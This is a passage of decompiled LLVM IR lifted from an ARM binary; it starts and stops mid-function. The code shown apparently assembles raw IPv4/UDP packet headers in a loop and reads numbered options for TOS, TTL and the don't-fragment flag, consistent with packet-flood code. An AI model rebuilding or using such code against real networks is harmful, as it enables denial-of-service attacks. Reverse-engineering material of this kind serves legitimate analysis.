  store i32 %v0_d524, i32* %r3.global-to-local, align 4
  %v4_d528 = call i32 @function_e480(i32 %v0_d510, i32 %v0_d518, i32 %v5_d51c, i32 %v0_d524)
  %v5_d528 = trunc i32 %v4_d528 to i8
  store i32 %v4_d528, i32* %r0.global-to-local, align 4
  %v4_d52c38 = udiv i32 %v4_d528, 256
  %v1_d530 = trunc i32 %v4_d52c38 to i8
  %v2_d530 = load i32, i32* @r6, align 4
  %v3_d530 = add i32 %v2_d530, 7
  %v4_d530 = inttoptr i32 %v3_d530 to i8*
  store i8 %v1_d530, i8* %v4_d530, align 1
  %v3_d534 = load i32, i32* @r6, align 4
  %v4_d534 = add i32 %v3_d534, 6
  %v5_d534 = inttoptr i32 %v4_d534 to i8*
  store i8 %v5_d528, i8* %v5_d534, align 1
  %v3_d538 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d538, i32* %r3.global-to-local, align 4
  %v0_d53c = load i32, i32* @r5, align 4
  %v1_d53c = add i32 %v0_d53c, 20
  %v2_d53c = inttoptr i32 %v1_d53c to i32*
  %v3_d53c = load i32, i32* %v2_d53c, align 4
  %v3_d544 = udiv i32 %v3_d53c, 65536
  store i32 %v3_d544, i32* %r2.global-to-local, align 4
  %v5_d548 = mul i32 %v3_d538, 24
  %v1_d54c = load i32, i32* @r8, align 4
  %v2_d54c = add i32 %v1_d54c, %v5_d548
  store i32 %v2_d54c, i32* %ip.global-to-local, align 4
  %v3_d55035 = udiv i32 %v3_d53c, 16777216
  %v1_d554 = trunc i32 %v3_d55035 to i8
  %v3_d554 = add i32 %v2_d54c, 3
  %v4_d554 = inttoptr i32 %v3_d554 to i8*
  store i8 %v1_d554, i8* %v4_d554, align 1
  %v0_d558 = load i32, i32* %r2.global-to-local, align 4
  %v1_d558 = trunc i32 %v0_d558 to i8
  %v2_d558 = load i32, i32* %ip.global-to-local, align 4
  %v3_d558 = add i32 %v2_d558, 2
  %v4_d558 = inttoptr i32 %v3_d558 to i8*
  store i8 %v1_d558, i8* %v4_d558, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d560 = load i32, i32* @r5, align 4
  store i32 %v0_d560, i32* %r1.global-to-local, align 4
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v0_d568 = load i32, i32* @fp, align 4
  store i32 %v0_d568, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_d570 = load i32, i32* %ip.global-to-local, align 4
  %v6_d578 = inttoptr i32 %v0_d560 to i32*
  %v7_d578 = call i32 @function_1372c(i32 %v3_d260, i32* %v6_d578, i32 %v0_d568, i32 16384, i32 %v0_d570, i32 16)
  %v3_d57c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v1_d580 = add i32 %v3_d57c, 1
  store i32 %v1_d580, i32* %r0.global-to-local, align 4
  %v1_d584 = load i32, i32* @sl, align 4
  %v9_d584 = icmp eq i32 %v1_d580, %v1_d584
  store i1 %v9_d584, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d580, i32* %stack_var_-40, align 4
  %v5_d58c = icmp slt i32 %v1_d580, %v1_d584
  br i1 %v5_d58c, label %dec_label_pc_d480, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d4e8
  %v2_d590 = icmp eq i32 %v1_d584, 0
  store i1 %v2_d590, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d470.outer

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d480
  %v1_d59c = add i32 %v2_d488, 16
  %v2_d59c = inttoptr i32 %v1_d59c to i32*
  %v3_d59c = load i32, i32* %v2_d59c, align 4
  %v0_d5a0 = call i32 @function_fe24()
  store i32 %v0_d5a0, i32* %r0.global-to-local, align 4
  %v3_d5a4 = load i32, i32* %stack_var_-40, align 4
  %v5_d5ac = mul i32 %v3_d5a4, 24
  %v1_d5b4 = load i32, i32* @r8, align 4
  %v2_d5b4 = add i32 %v1_d5b4, %v5_d5ac
  store i32 %v2_d5b4, i32* %r1.global-to-local, align 4
  %v1_d5b8 = and i32 %v3_d59c, 65280
  store i32 %v1_d5b8, i32* %r3.global-to-local, align 4
  %v1_d5b0 = udiv i32 %v3_d59c, 256
  %v3_d5bc = and i32 %v1_d5b0, 65280
  store i32 %v3_d5bc, i32* %r2.global-to-local, align 4
  %v3_d5c0 = mul i32 %v3_d59c, 16777216
  store i32 %v3_d5c0, i32* %ip.global-to-local, align 4
  %v1_d5c4 = add i32 %v2_d5b4, 20
  %v2_d5c4 = inttoptr i32 %v1_d5c4 to i8*
  %v3_d5c4 = load i8, i8* %v2_d5c4, align 1
  %v4_d5c4 = zext i8 %v3_d5c4 to i32
  %v4_d5c8 = mul nuw nsw i32 %v1_d5b8, 256
  %v5_d5c8 = or i32 %v4_d5c8, %v3_d5c0
  store i32 %v5_d5c8, i32* %ip.global-to-local, align 4
  %v2_d5d0 = call i32 @llvm.bswap.i32(i32 %v3_d59c)
  %v7_d5d4 = lshr i32 %v0_d5a0, %v4_d5c4
  %v8_d5d4 = add i32 %v7_d5d4, %v2_d5d0
  store i32 %v8_d5d4, i32* %r2.global-to-local, align 4
  %v3_d5e0 = mul i32 %v8_d5d4, 16777216
  %v1_d5d8 = mul i32 %v8_d5d4, 256
  %v4_d5e4 = and i32 %v1_d5d8, 16711680
  %v5_d5e4 = or i32 %v4_d5e4, %v3_d5e0
  store i32 %v5_d5e4, i32* %r1.global-to-local, align 4
  store i32 %v6_d24c, i32* %r0.global-to-local, align 4
  %v2_d5f4 = call i32 @llvm.bswap.i32(i32 %v8_d5d4)
  store i32 %v2_d5f4, i32* %r3.global-to-local, align 4
  store i1 %v7_d4a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d5fc = load i32, i32* @r5, align 4
  %v2_d5fc = add i32 %v1_d5fc, 16
  %v3_d5fc = inttoptr i32 %v2_d5fc to i32*
  store i32 %v2_d5f4, i32* %v3_d5fc, align 4
  br i1 %v2_d4a8, label %dec_label_pc_d604, label %dec_label_pc_d4b0

dec_label_pc_d604:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d4a4
  %v0_d604 = call i32 @function_fe24()
  store i32 %v0_d604, i32* %r0.global-to-local, align 4
  store i32 %v3_d2b8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_d614, i1* %cpsr_z.global-to-local, align 1
  %v1_d618 = load i32, i32* @r5, align 4
  %v2_d618 = add i32 %v1_d618, 12
  %v3_d618 = inttoptr i32 %v2_d618 to i32*
  store i32 %v0_d604, i32* %v3_d618, align 4
  br i1 %v9_d614, label %dec_label_pc_d620, label %dec_label_pc_d604.dec_label_pc_d4c4_crit_edge

dec_label_pc_d604.dec_label_pc_d4c4_crit_edge:    ; preds = %dec_label_pc_d604
  %v1_d4c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4c4

dec_label_pc_d620:                                ; preds = %dec_label_pc_d604, %dec_label_pc_d4b0
  %v0_d620 = call i32 @function_fe24()
  %v1_d620 = trunc i32 %v0_d620 to i8
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  store i32 %v3_d2d4, i32* %r2.global-to-local, align 4
  %v4_d628 = sdiv i32 %v0_d620, 256
  store i32 %v4_d628, i32* %r3.global-to-local, align 4
  %v1_d62c = load i32, i32* @r4, align 4
  %v9_d62c = icmp eq i32 %v3_d2d4, %v1_d62c
  store i1 %v9_d62c, i1* %cpsr_z.global-to-local, align 1
  %v1_d630 = trunc i32 %v4_d628 to i8
  %v2_d630 = load i32, i32* @r5, align 4
  %v3_d630 = add i32 %v2_d630, 5
  %v4_d630 = inttoptr i32 %v3_d630 to i8*
  store i8 %v1_d630, i8* %v4_d630, align 1
  %v3_d634 = load i32, i32* @r5, align 4
  %v4_d634 = add i32 %v3_d634, 4
  %v5_d634 = inttoptr i32 %v4_d634 to i8*
  store i8 %v1_d620, i8* %v5_d634, align 1
  %v0_d638 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d638, label %dec_label_pc_d63c, label %dec_label_pc_d620.dec_label_pc_d4d0_crit_edge

dec_label_pc_d620.dec_label_pc_d4d0_crit_edge:    ; preds = %dec_label_pc_d620
  %v1_d4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d4d0

dec_label_pc_d63c:                                ; preds = %dec_label_pc_d620, %dec_label_pc_d4c4
  %v0_d63c = call i32 @function_fe24()
  %v1_d63c = trunc i32 %v0_d63c to i8
  store i32 %v0_d63c, i32* %r0.global-to-local, align 4
  %v4_d640 = sdiv i32 %v0_d63c, 256
  store i32 %v4_d640, i32* %r3.global-to-local, align 4
  %v3_d644 = load i32, i32* @r5, align 4
  %v4_d644 = add i32 %v3_d644, 20
  %v5_d644 = inttoptr i32 %v4_d644 to i8*
  store i8 %v1_d63c, i8* %v5_d644, align 1
  %v0_d648 = load i32, i32* %r3.global-to-local, align 4
  %v1_d648 = trunc i32 %v0_d648 to i8
  %v2_d648 = load i32, i32* @r6, align 4
  %v3_d648 = add i32 %v2_d648, 1
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v1_d650 = load i32, i32* @r4, align 4
  %v9_d650 = icmp eq i32 %v3_d2d8, %v1_d650
  store i1 %v9_d650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d650, label %dec_label_pc_d658, label %dec_label_pc_d4dc

dec_label_pc_d658:                                ; preds = %dec_label_pc_d63c, %dec_label_pc_d4d0
  %v0_d658 = call i32 @function_fe24()
  %v1_d658 = trunc i32 %v0_d658 to i8
  store i32 %v0_d658, i32* %r0.global-to-local, align 4
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %v4_d660 = sdiv i32 %v0_d658, 256
  store i32 %v4_d660, i32* %r3.global-to-local, align 4
  store i1 %v2_d4e0, i1* %cpsr_z.global-to-local, align 1
  %v1_d668 = trunc i32 %v4_d660 to i8
  %v2_d668 = load i32, i32* @r6, align 4
  %v3_d668 = add i32 %v2_d668, 3
  %v4_d668 = inttoptr i32 %v3_d668 to i8*
  store i8 %v1_d668, i8* %v4_d668, align 1
  %v3_d66c = load i32, i32* @r6, align 4
  %v4_d66c = add i32 %v3_d66c, 2
  %v5_d66c = inttoptr i32 %v4_d66c to i8*
  store i8 %v1_d658, i8* %v5_d66c, align 1
  %v0_d670 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d670, label %dec_label_pc_d4e8, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d658
  %v0_d674 = load i32, i32* @r5, align 4
  %v1_d674 = add i32 %v0_d674, 28
  store i32 %v1_d674, i32* %r0.global-to-local, align 4
  store i32 %v0_d2b0, i32* @r1, align 4
  %v1_d67c = inttoptr i32 %v1_d674 to i8*
  %v2_d67c = call i32 @function_10000(i8* %v1_d67c)
  store i32 %v2_d67c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d4e8

dec_label_pc_d684:                                ; preds = %dec_label_pc_d270
  store i32 %v3_d260, i32* %r0.global-to-local, align 4
  %v1_d688 = call i32 @function_12e9c(i32 %v3_d260)
  store i32 %v1_d688, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d68c

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d124, %dec_label_pc_d684
  %v29_d690 = phi i32 [ %v3_d260, %dec_label_pc_d124 ], [ %v1_d688, %dec_label_pc_d684 ]
  store i32 %v18_d124, i32* %sb.global-to-local, align 4
  store i32 %v24_d124, i32* %fp.global-to-local, align 4
  ret i32 %v29_d690

dec_label_pc_d694:                                ; preds = %dec_label_pc_d2f4
  %v3_d698 = sext i8 %v5_d358 to i32
  %v7_d698 = sext i8 %v5_d35c to i32
  %v3_d69c = sdiv i32 %v3_d698, 256
  store i32 %v3_d69c, i32* %r0.global-to-local, align 4
  %v3_d6a0 = sdiv i32 %v7_d698, 256
  store i32 %v3_d6a0, i32* %r1.global-to-local, align 4
  store i32 %v1_d330, i32* %r2.global-to-local, align 4
  store i32 %v1_d334, i32* %r3.global-to-local, align 4
  %v3_d6ac34 = udiv i32 %v1_d34c, 256
  store i32 %v3_d6ac34, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_d718 = sext i8 %v5_d1b4 to i32
  %sext11 = mul i32 %v1_d328, 16777216
  %v4_d770 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v0_d2c4, 16777216
  %v4_d774 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_d2c0, 16777216
  %v4_d790 = sdiv i32 %sext13, 16777216
  %v1_d77c = trunc i32 %v3_d6a0 to i8
  %v1_d798 = trunc i32 %v4_d790 to i8
  br label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %dec_label_pc_d6c8, %dec_label_pc_d694
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d6d4 = call i32 @function_13a94(i32 1510, i32 1)
  store i32 %v2_d6d4, i32* %r0.global-to-local, align 4
  store i32 %v2_d144, i32* %r1.global-to-local, align 4
  %v3_d6dc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d6dc, i32* %r2.global-to-local, align 4
  %v2_d6e0 = load i32, i32* @r6, align 4
  %v5_d6e0 = mul i32 %v2_d6e0, 4
  %v6_d6e0 = add i32 %v5_d6e0, %v2_d144
  %v7_d6e0 = inttoptr i32 %v6_d6e0 to i32*
  store i32 %v2_d6d4, i32* %v7_d6e0, align 4
  %v0_d6e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6e4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d6e4 = mul i32 %v1_d6e4, 4
  %v5_d6e4 = add i32 %v4_d6e4, %v0_d6e4
  %v6_d6e4 = inttoptr i32 %v5_d6e4 to i32*
  %v7_d6e4 = load i32, i32* %v6_d6e4, align 4
  store i32 %v7_d6e4, i32* %r1.global-to-local, align 4
  %v1_d6e8 = inttoptr i32 %v7_d6e4 to i8*
  %v2_d6e8 = load i8, i8* %v1_d6e8, align 1
  %tmp85 = urem i8 %v2_d6e8, 16
  %v1_d6ec = zext i8 %tmp85 to i32
  %v1_d6f0 = or i32 %v1_d6ec, 64
  store i32 %v1_d6f0, i32* %r3.global-to-local, align 4
  %v1_d6f4 = trunc i32 %v1_d6f0 to i8
  store i8 %v1_d6f4, i8* %v1_d6e8, align 1
  %v0_d6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6f8 = inttoptr i32 %v0_d6f8 to i8*
  %v2_d6f8 = load i8, i8* %v1_d6f8, align 1
  %v3_d6f8 = zext i8 %v2_d6f8 to i32
  %v1_d6fc = and i32 %v3_d6f8, 240
  %v1_d700 = or i32 %v1_d6fc, 5
  store i32 %v1_d700, i32* %r2.global-to-local, align 4
  %v3_d708 = add i32 %v0_d6f8, 9
  %v4_d708 = inttoptr i32 %v3_d708 to i8*
  store i8 17, i8* %v4_d708, align 1
  %v0_d70c = load i32, i32* %r2.global-to-local, align 4
  %v1_d70c = trunc i32 %v0_d70c to i8
  %v2_d70c = load i32, i32* %r1.global-to-local, align 4
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  store i8 %v1_d70c, i8* %v3_d70c, align 1
  %v2_d714 = load i32, i32* %r1.global-to-local, align 4
  %v3_d714 = add i32 %v2_d714, 1
  %v4_d714 = inttoptr i32 %v3_d714 to i8*
  store i8 %v5_d17c, i8* %v4_d714, align 1
  store i32 %v4_d718, i32* %r0.global-to-local, align 4
  %v2_d71c = load i32, i32* %r1.global-to-local, align 4
  %v3_d71c = add i32 %v2_d71c, 8
  %v4_d71c = inttoptr i32 %v3_d71c to i8*
  store i8 %v5_d1b4, i8* %v4_d71c, align 1
  %v3_d720 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d720, i32* %r2.global-to-local, align 4
  store i32 %v6_d24c, i32* %ip.global-to-local, align 4
  %v3_d728 = mul i32 %v3_d720, 32
  store i32 %v3_d728, i32* %r3.global-to-local, align 4
  %v1_d72c = load i32, i32* %r1.global-to-local, align 4
  %v2_d72c = add i32 %v1_d72c, 12
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v6_d24c, i32* %v3_d72c, align 4
  %v0_d730 = load i32, i32* %r3.global-to-local, align 4
  %v1_d730 = load i32, i32* %r2.global-to-local, align 4
  %tmp86 = mul i32 %v1_d730, -8
  %v5_d730 = add i32 %v0_d730, %tmp86
  %v1_d734 = load i32, i32* @r8, align 4
  %v2_d734 = add i32 %v5_d730, %v1_d734
  store i32 %v2_d734, i32* %r3.global-to-local, align 4
  %v1_d738 = add i32 %v2_d734, 16
  %v2_d738 = inttoptr i32 %v1_d738 to i32*
  %v3_d738 = load i32, i32* %v2_d738, align 4
  store i32 %v3_d738, i32* %ip.global-to-local, align 4
  %v1_d73c = add i32 %v1_d730, 1
  store i32 %v1_d73c, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d748 = load i32, i32* %r1.global-to-local, align 4
  %v3_d748 = add i32 %v2_d748, 6
  %v4_d748 = inttoptr i32 %v3_d748 to i8*
  store i8 64, i8* %v4_d748, align 1
  %v0_d74c = load i32, i32* %r2.global-to-local, align 4
  %v1_d74c = trunc i32 %v0_d74c to i8
  %v2_d74c = load i32, i32* %r1.global-to-local, align 4
  %v3_d74c = add i32 %v2_d74c, 7
  %v4_d74c = inttoptr i32 %v3_d74c to i8*
  store i8 %v1_d74c, i8* %v4_d74c, align 1
  %v0_d750 = load i32, i32* %ip.global-to-local, align 4
  %v1_d750 = load i32, i32* %r1.global-to-local, align 4
  %v2_d750 = add i32 %v1_d750, 16
  %v3_d750 = inttoptr i32 %v2_d750 to i32*
  store i32 %v0_d750, i32* %v3_d750, align 4
  store i32 %v3_d69c, i32* %r3.global-to-local, align 4
  store i32 %v7_d698, i32* %ip.global-to-local, align 4
  %v2_d760 = load i32, i32* %r1.global-to-local, align 4
  %v3_d760 = add i32 %v2_d760, 2
  %v4_d760 = inttoptr i32 %v3_d760 to i8*
  store i8 %v5_d358, i8* %v4_d760, align 1
  %v0_d764 = load i32, i32* %r3.global-to-local, align 4
  %v1_d764 = trunc i32 %v0_d764 to i8
  %v2_d764 = load i32, i32* %r1.global-to-local, align 4
  %v3_d764 = add i32 %v2_d764, 3
  %v4_d764 = inttoptr i32 %v3_d764 to i8*
  store i8 %v1_d764, i8* %v4_d764, align 1
  %v0_d768 = load i32, i32* %ip.global-to-local, align 4
  %v1_d768 = trunc i32 %v0_d768 to i8
  %v2_d768 = load i32, i32* %r1.global-to-local, align 4
  %v3_d768 = add i32 %v2_d768, 4
  %v4_d768 = inttoptr i32 %v3_d768 to i8*
  store i8 %v1_d768, i8* %v4_d768, align 1
  store i32 %v3_d6a0, i32* %r2.global-to-local, align 4
  store i32 %v4_d770, i32* %r3.global-to-local, align 4
  store i32 %v4_d774, i32* %ip.global-to-local, align 4
  %v0_d778 = load i32, i32* %r1.global-to-local, align 4
  %v1_d778 = add i32 %v0_d778, 20
  store i32 %v1_d778, i32* %r0.global-to-local, align 4
  %v3_d77c = add i32 %v0_d778, 5
  %v4_d77c = inttoptr i32 %v3_d77c to i8*
  store i8 %v1_d77c, i8* %v4_d77c, align 1
  %v0_d780 = load i32, i32* @r4, align 4
  %v1_d780 = trunc i32 %v0_d780 to i8
  %v2_d780 = load i32, i32* %r1.global-to-local, align 4
  %v3_d780 = add i32 %v2_d780, 20
  %v4_d780 = inttoptr i32 %v3_d780 to i8*
  store i8 %v1_d780, i8* %v4_d780, align 1
  %v0_d784 = load i32, i32* %r3.global-to-local, align 4
  %v1_d784 = trunc i32 %v0_d784 to i8
  %v2_d784 = load i32, i32* %r0.global-to-local, align 4
  %v3_d784 = add i32 %v2_d784, 5
  %v4_d784 = inttoptr i32 %v3_d784 to i8*
  store i8 %v1_d784, i8* %v4_d784, align 1
  %v0_d788 = load i32, i32* %ip.global-to-local, align 4
  %v1_d788 = trunc i32 %v0_d788 to i8
  %v2_d788 = load i32, i32* %r0.global-to-local, align 4
  %v3_d788 = add i32 %v2_d788, 1
  %v4_d788 = inttoptr i32 %v3_d788 to i8*
  store i8 %v1_d788, i8* %v4_d788, align 1
  %v0_d78c = load i32, i32* @r5, align 4
  %v1_d78c = trunc i32 %v0_d78c to i8
  %v2_d78c = load i32, i32* %r0.global-to-local, align 4
  %v3_d78c = add i32 %v2_d78c, 2
  %v4_d78c = inttoptr i32 %v3_d78c to i8*
  store i8 %v1_d78c, i8* %v4_d78c, align 1
  store i32 %v4_d790, i32* %r1.global-to-local, align 4
  %v0_d794 = load i32, i32* @r6, align 4
  %v1_d794 = load i32, i32* @sl, align 4
  %v9_d794 = icmp eq i32 %v0_d794, %v1_d794
  store i1 %v9_d794, i1* %cpsr_z.global-to-local, align 1
  %v2_d798 = load i32, i32* %r0.global-to-local, align 4
  %v3_d798 = add i32 %v2_d798, 3
  %v4_d798 = inttoptr i32 %v3_d798 to i8*
  store i8 %v1_d798, i8* %v4_d798, align 1
  %v0_d79c = load i32, i32* @r7, align 4
  %v1_d79c = trunc i32 %v0_d79c to i8
  %v2_d79c = load i32, i32* %r0.global-to-local, align 4
  %v3_d79c = add i32 %v2_d79c, 4
  %v4_d79c = inttoptr i32 %v3_d79c to i8*
  store i8 %v1_d79c, i8* %v4_d79c, align 1
  %v0_d7a0 = load i32, i32* @r6, align 4
  store i32 %v0_d7a0, i32* %stack_var_-40, align 4
  %v5_d7a4 = icmp slt i32 %v0_d794, %v1_d794
  br i1 %v5_d7a4, label %dec_label_pc_d6c8, label %dec_label_pc_d468

; uselistorder directives
  uselistorder i32 %v1_d730, { 1, 0 }
  uselistorder i32 %v3_d6a0, { 2, 1, 0 }
  uselistorder i32 %v3_d69c, { 1, 0 }
  uselistorder i32 %v7_d698, { 1, 0 }
  uselistorder i32 %v4_d660, { 1, 0 }
  uselistorder i32 %v0_d658, { 0, 2, 1 }
  uselistorder i32 %v0_d63c, { 0, 2, 1 }
  uselistorder i32 %v4_d628, { 1, 0 }
  uselistorder i32 %v0_d620, { 0, 2, 1 }
  uselistorder i32 %v2_d5f4, { 1, 0 }
  uselistorder i32 %v8_d5d4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_d5c0, { 1, 0 }
  uselistorder i32 %v3_d59c, { 1, 3, 2, 0 }
  uselistorder i1 %v2_d590, { 1, 0 }
  uselistorder i32 %v1_d584, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d580, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_d528, { 0, 2, 1 }
  uselistorder i32 %v0_d510, { 1, 0, 2, 3 }
  uselistorder i32 %v4_d4fc, { 1, 0 }
  uselistorder i32 %v2_d4f8, { 0, 2, 1 }
  uselistorder i1 %v7_d4a8, { 2, 1, 0 }
  uselistorder i1 %v9_d614, { 2, 3, 1, 0 }
  uselistorder i8 %v5_d358, { 0, 2, 1 }
  uselistorder i32 %v3_d344, { 1, 0 }
  uselistorder i32 %v1_d334, { 2, 3, 0, 1 }
  uselistorder i32 %v1_d330, { 1, 2, 0 }
  uselistorder i32 %v1_d328, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_d320, { 1, 0 }
  uselistorder i32 %v1_d2f8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d2d8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_d2b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v0_d2b4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_d2b0, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_d2a4, { 3, 1, 2, 0 }
  uselistorder i1 %v7_d290, { 1, 0 }
  uselistorder i1 %v7_d264, { 1, 0 }
  uselistorder i32 %v3_d260, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_d24c, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_d238, { 3, 1, 2, 0 }
  uselistorder i32 %v1_d1c4, { 1, 0 }
  uselistorder i8 %v5_d1b4, { 1, 0, 2 }
  uselistorder i32 %v5_d198, { 1, 0 }
  uselistorder i8 %v5_d17c, { 0, 2, 1 }
  uselistorder i32 %v6_d15c, { 1, 0 }
  uselistorder i32 %v2_d144, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_d128, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 48, 47, 49, 50, 52, 51, 54, 53, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 14, 13, 15, 16, 17, 19, 18, 21, 20, 22, 24, 23, 30, 25, 26, 27, 28, 29, 35, 31, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i8*)* @function_10000, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_d68c, { 1, 0 }
  uselistorder label %dec_label_pc_d674, { 1, 0 }
  uselistorder label %dec_label_pc_d4e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d470, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_d7b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d7b0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_d7b0 = load i32, i32* @r4, align 4
  %v12_d7b0 = load i32, i32* @r7, align 4
  %v1_d7b4 = urem i32 %arg1, 256
  store i32 %v1_d7b4, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_d7c8 = urem i32 %arg3, 256
  store i32 %v1_d7c8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_d7d0 = call i32 @function_13a94(i32 %v1_d7b4, i32 4)
  %v0_d7d4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d7e0 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d7e8 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e8 = call i32 @function_a4e8(i32 %v0_d7e0, i32* %v5_d7e8, i32 2, i32 0)
  %v1_d7f4 = urem i32 %v6_d7e8, 256
  store i32 %v1_d7f4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d800 = load i32, i32* @r4, align 4
  %v0_d804 = load i32, i32* @r5, align 4
  %v5_d808 = trunc i32 %v6_d7e8 to i8
  %v6_d80c = inttoptr i32 %v0_d804 to i32*
  %v7_d80c = call i32 @function_a4e8(i32 %v0_d800, i32* %v6_d80c, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_d810 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d80c, i32* @r7, align 4
  %v0_d820 = load i32, i32* @r4, align 4
  %v4_d824 = inttoptr i32 %v0_d810 to i32*
  %v5_d824 = call i32 @function_a4e8(i32 %v0_d820, i32* %v4_d824, i32 4, i32 64)
  %v1_d82c = urem i32 %v5_d824, 256
  store i32 %v1_d82c, i32* %ip.global-to-local, align 4
  %v0_d830 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d83c = load i32, i32* @r4, align 4
  %v5_d840 = trunc i32 %v5_d824 to i8
  %v6_d844 = inttoptr i32 %v0_d830 to i32*
  %v7_d844 = call i32 @function_a4e8(i32 %v0_d83c, i32* %v6_d844, i32 5, i32 0)
